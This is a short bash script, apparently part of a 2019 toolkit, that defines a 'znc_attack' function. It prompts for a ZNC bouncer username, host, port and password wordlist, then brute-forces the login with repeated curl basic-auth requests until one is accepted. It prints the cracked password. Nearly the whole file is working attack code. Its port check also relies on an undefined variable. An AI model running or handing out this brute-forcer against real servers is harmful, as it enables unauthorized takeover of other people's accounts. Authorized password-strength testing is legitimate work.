#!/bin/bash
####
#### Copyright (C) 2019  wuseman <wuseman@nr1.nu> - All Rights Reserved
#### Created: 27-01-2019
####

znc_attack() {
read -p "ZNC User: " zuser
if [[ -z $zuser ]]; then
echo "You must enter a username, aborted"
exit 0
fi

read -p "ZNC Host: " zhost
if [[ -z $zhost ]]; then
echo "You must enter a hostname or ip number, aborted"
exit 0
fi

read -p "ZNC Port: " zport
if [[ -z $zport ]]; then
echo "You must enter a port, aborted."
exit 0
fi

if ! [[ $zport =~ $re ]] ; then
   echo "That's not a valid port, aborted" >&2; exit 1
fi

read -p "ZNC Wordlist: " zwordlist
if [[ -z $zwordlist ]]; then
echo "You must enter a a wordlist"
exit 0
fi

if [[ ! -f $zwordlist ]]; then
echo "Can't find $zwordlist, aborted"
exit 0
fi

printf "\n====================================================="
printf "\nBruteforce attack will be started within 2 seconds..\n"
printf "Please use (CTRL+C) to abort the attack at anytime..\n"
printf "=====================================================\n"
while read line; do
curl -s https://$zhost:$zport --user $zuser:$line | grep Unauthorized &> /dev/null
if [[ "$?" -gt "0" ]]; then
sleep 1
echo -e "====================================================="
echo -e "Password for $zuser has been found: \e[1;32m$line\e[0m"
echo -e "=====================================================\n"
exit 0
else
echo -e "Wrong password for $zuser: \e[1;31m$line\e[0m"
fi
done < $zwordlist
}
